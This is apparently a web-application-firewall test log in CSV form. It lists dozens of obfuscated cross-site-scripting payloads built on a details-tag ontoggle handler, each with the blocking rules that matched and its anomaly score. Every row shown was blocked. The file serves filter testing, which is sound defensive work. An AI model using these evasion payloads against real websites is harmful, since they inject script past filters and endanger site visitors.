273,"<details open ontoggle=""(function(){var a=window.String.fromCharCode(0141,0154,0145,0162,0164);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o101,11v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,114t:urlDecodeUni,t:compressWhitespace || ",25,17760333240.160490
274,"<details open ontoggle=""(function(){var a=String['\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065'](97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o151,11v217,164t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,164 || v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o145,9v217,164t:urlDecodeUni,t:compressWhitespace || ",25,177603332561.593012
275,"<details open ontoggle=""(function(){var a=this.String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o99,11v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o93,9v217,112t:urlDecodeUni,t:compressWhitespace || ",25,17760333262.945152
276,"<details open ontoggle=""(function(){var a=String['from'['concat']('Char','Code')](97,108,101,114,116);window[a](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,71v217,121t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,121 || v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,121t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o102,9v217,121t:urlDecodeUni,t:compressWhitespace || ",25,177603332764.341813
277,"<details open ontoggle=""(function(){var a=eval(atob('U3RyaW5nLmZyb21DaGFyQ29kZSg5NywxMDgsMTAxLDExNCwxMTYp'));window[a](1);})()"">",0,1,block,7,"933160,933210,934100,941100,941120,941370,949110","o42,84v217,128 || o115,11v217,128t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,128 || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o109,9v217,128t:urlDecodeUni,t:compressWhitespace || ",30,177603332869.689574
278,"<details open ontoggle=""(function(){var a=(0,eval)('Stri'+'ng')['fromCharCode'](0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o50,73v217,125t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,125 || o25,11v217,125t:urlDecodeUni || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o106,9v217,125t:urlDecodeUni,t:compressWhitespace || ",30,177603332981.131366
279,"<details open ontoggle=""(function(){var a=Function('return St'+'ring')()['fromCharCode'](97,108,101,114,116);window[a](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o50,76v217,128t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,128 || o25,11v217,128t:urlDecodeUni || v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,128t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o109,9v217,128t:urlDecodeUni,t:compressWhitespace || ",30,177603333013.569807
280,"<details open ontoggle=""(function(){var a=String['fromCharCode'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,57v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,107t:urlDecodeUni,t:compressWhitespace || ",25,17760333314.961875
281,"<details open ontoggle=""(function(){var a=String[atob('ZnJvbUNoYXJDb2Rl')](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,67v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,117t:urlDecodeUni,t:compressWhitespace || ",25,177603333215.679557
282,"<details open ontoggle=""(function(){var a=top[atob('U3RyaW5n')].fromCharCode(97,108,101,114,116);top[a]('XSS')})()"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o96,4v217,116 || o100,14v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,21v217,116t:urlDecodeUni,t:compressWhitespace || ",30,177603333365.719888
283,"<details open ontoggle=""(function(){var a=[]['constructor']['constructor'](atob('cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGU='))()(97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o42,121v217,165t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,165 || v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o143,9v217,165t:urlDecodeUni,t:compressWhitespace || ",25,177603333362.999127
284,"<details open ontoggle=""(function(){var a=''['constructor']['fromCharCode'](97,108,101,114,116);self[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o44,70v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o96,7v217,116t:urlDecodeUni,t:compressWhitespace || ",25,177603333462.006065
285,"<details open ontoggle=""(function(){var a=this['String']['fromCharCode'](0x61,0x6c,0x65,0x72,0x74);this[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o46,71v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,119 || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,14v217,119t:urlDecodeUni,t:compressWhitespace || ",25,177603333586.009096
287,"<details open ontoggle=""(function(){var a=globalThis['String']['fromCharCode'](97,108,101,114,116);globalThis[a]('XSS')})()"">",0,1,block,5,"933210,934100,941100,941120,949110","o52,71v217,125t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,125 || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603333710.522167
288,"<details open ontoggle=""(function(){var a=String['fromCharCode']['call'](null,97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,70v217,120t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o98,9v217,120t:urlDecodeUni,t:compressWhitespace || ",25,177603333876.508587
289,"<details open ontoggle=""(function(){var a=String['fromCharCode']['apply'](null,[97,108,101,114,116]);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,73v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,123 || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o101,9v217,123t:urlDecodeUni,t:compressWhitespace || ",25,177603333956.889346
290,"<details open ontoggle=""(function(){var a=(0,eval)('String')['fromCharCode'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o50,67v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,119 || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o97,9v217,119t:urlDecodeUni,t:compressWhitespace || ",25,177603334098.950703
291,"<details open ontoggle=""(function(){var a=[]['flat']['constructor']('return String')()['fromCharCode'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o42,101v217,145t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,145 || v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o123,9v217,145t:urlDecodeUni,t:compressWhitespace || ",25,177603334125.808404
292,"<details open ontoggle=""(function(){var a=({})['constructor']['constructor']('return String')()['fromCharCode'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o42,110v217,154t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,154 || v217,154t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,154t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o132,9v217,154t:urlDecodeUni,t:compressWhitespace || ",25,177603334219.472881
293,"<details open ontoggle=""(function(){var a=`${String['fromCharCode'](97,108,101,114,116)}`;window[a]('XSS')})()"">",0,1,block,7,"932130,933210,934100,941100,941120,941370,949110","o42,60v217,112t:urlDecodeUni,t:cmdLine || o51,59v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,112t:urlDecodeUni,t:compressWhitespace || ",30,177603334339.756961
294,"<details open ontoggle=""(function(){var a=String['fromCo\u0064ePoint'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o97,14v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,113 || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,9v217,113t:urlDecodeUni,t:compressWhitespace || ",25,177603334426.711859
295,"<details open ontoggle=""(function(){var a=String['from\u0043harCode'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o96,14v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,112t:urlDecodeUni,t:compressWhitespace || ",25,177603334561.602978
296,"<details open ontoggle=""(function(){var a=String['\x66romCharCode'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,14v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,17760333461.963735
297,"<details open ontoggle=""(function(){var a=String['fromCharC\x6fde'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,14v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,177603334659.595997
298,"<details open ontoggle=""(function(){var a=String['from'+'CharCode'](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,60v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || o25,11v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,110t:urlDecodeUni,t:compressWhitespace || ",30,177603334771.803037
299,"<details open ontoggle=""(function(){var a=String['from'.concat('CharCode')](97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,68v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o96,9v217,118t:urlDecodeUni,t:compressWhitespace || ",25,17760333481.883749
300,"<details open ontoggle=""(function(){var a=String['fromCharCode'](97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,54v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,9v217,105t:urlDecodeUni,t:compressWhitespace || ",25,177603334998.754908
302,"<details open ontoggle=""(function(){var a=String['from'+'CharCode'](97,108,101,114,116);window[a](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o48,57v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || o25,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,108t:urlDecodeUni,t:compressWhitespace || ",30,177603335139.299401
303,"<details open ontoggle=""(function(){var a=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,11v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603335260.289863
305,"<details open ontoggle=""(function(){var a=(String).fromCharCode(97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o90,11v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o84,9v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177603335427.101961
306,"<details open ontoggle=""(function(){var a=String[atob('ZnJvbUNoYXJDb2Rl')](97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o48,64v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,115t:urlDecodeUni,t:compressWhitespace || ",25,177603335587.828684
308,"<details open ontoggle=""(function(){var a=''['constructor']['fromCharCode'](97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o44,69v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o96,9v217,116t:urlDecodeUni,t:compressWhitespace || ",25,177603335751.384426
309,"<details open ontoggle=""(function(){var a=String.fromCodePoint(97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o89,11v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o83,9v217,103t:urlDecodeUni,t:compressWhitespace || ",25,177603335882.180119
310,"<details open ontoggle=""(function(){var a=String.fromCharCode(0141,0154,0145,0162,0164);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o94,11v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v217,108t:urlDecodeUni,t:compressWhitespace || ",25,177603335976.828961
313,"<details open ontoggle=""(function(){var a=String.fromCharCode(97)+String.fromCharCode(108,101,114,116);window[a](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o109,11v217,123t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,123 || o25,11v217,123t:urlDecodeUni || v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,123t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o103,9v217,123t:urlDecodeUni,t:compressWhitespace || ",30,17760333621.570815
314,"<details open ontoggle=""(function(){var a=String.fromCharCode.apply(null,[97,108,101,114,116]);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o101,11v217,115t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o95,9v217,115t:urlDecodeUni,t:compressWhitespace || ",25,177603336331.213945
315,"<details open ontoggle=""(function(){var a=String.fromCharCode.call(null,97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o98,11v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o92,9v217,112t:urlDecodeUni,t:compressWhitespace || ",25,177603336365.011728
316,"<details open ontoggle=""(function(){var a=String.fromCharCode(97,...[108,101,114,116]);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o93,11v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o87,9v217,107t:urlDecodeUni,t:compressWhitespace || ",25,177603336481.939254
317,"<details open ontoggle=""(function(){var a=String.fromCharCode(97)+'lert';window[a](1);})();"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o79,11v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,93 || o25,11v217,93t:urlDecodeUni || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o73,9v217,93t:urlDecodeUni,t:compressWhitespace || ",30,177603336535.312173
318,"<details open ontoggle=""(function(){var a=String['from\u0043harCode'](97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o96,11v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o90,9v217,110t:urlDecodeUni,t:compressWhitespace || ",25,177603336669.905661
319,"<details open ontoggle=""(function(){var a=String['\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065'](97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o151,11v217,165t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,165 || v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o145,9v217,165t:urlDecodeUni,t:compressWhitespace || ",25,177603336745.961878
320,"<details open ontoggle=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o88,11v217,102t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v217,102t:urlDecodeUni,t:compressWhitespace || ",25,177603336895.818694
321,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');self[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o63,11v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,7v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177603336990.795632
322,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');top[a](1);})();"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o58,4v217,76 || o62,11v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,6v217,76t:urlDecodeUni,t:compressWhitespace || ",30,177603337090.912575
323,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');parent[a](1);})();"">",0,1,block,5,"933210,934100,941100,941120,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603337127.543811
324,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');this[a](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o63,11v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,7v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177603337255.266234
325,"<details open ontoggle=""(function(){var a=atob('YWxlcnQ=');globalThis[a](1);})();"">",0,1,block,5,"933210,934100,941100,941120,949110","o69,11v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603337312.862900
327,"<details open ontoggle=""(function(){var b=atob('YWxlcnQ=');window[b](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,79t:urlDecodeUni,t:compressWhitespace || ",25,17760333753.901931
328,"<details open ontoggle=""(function(){var c=atob('YWxlcnQ=');window[c](1);})();"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o65,11v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o59,9v217,79t:urlDecodeUni,t:compressWhitespace || ",25,177603337648.258576
